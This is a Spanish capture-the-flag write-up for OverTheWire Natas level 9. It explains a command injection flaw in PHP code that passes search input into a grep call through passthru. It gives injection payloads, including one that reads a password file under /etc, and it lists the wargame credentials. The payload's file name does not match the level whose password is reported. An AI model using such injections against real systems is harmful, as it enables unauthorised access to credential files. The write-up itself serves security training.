# Natas 9

#### URL: http://natas9.natas.labs.overthewire.org/

#### Credenciales: natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

Lo que introduzcamos en la entrada de busqueda sera el argumento del comando grep.

``` php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

Podemos introducir nuevos comandos simplemente usando ';COMANDO;', por ejemplo: 
``` bash
> grep -i ;echo hello there; dictionary.txt
Modo de empleo: grep [OPCIÓN]... PATRONES [FICHERO]...
Pruebe 'grep --help' para más información.
hello there
zsh: command not found: dictionary.txt
```

Como se puede observar se manda a la salida estandar el resultado de nuestro comando, y se manda al ERROR estandar el grep roto. Pero la funcion passthru no esta devolviendo el error estandar asi que veremos una salida limpia.

Podemos entonces introducir `;cat /etc/natas_webpass/natas9;` y obtener la contraseña:

![2025-03-19-214107_610x234_scrot](https://github.com/user-attachments/assets/eb22175d-4712-4561-86b5-1b268dfd367d)

`natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`

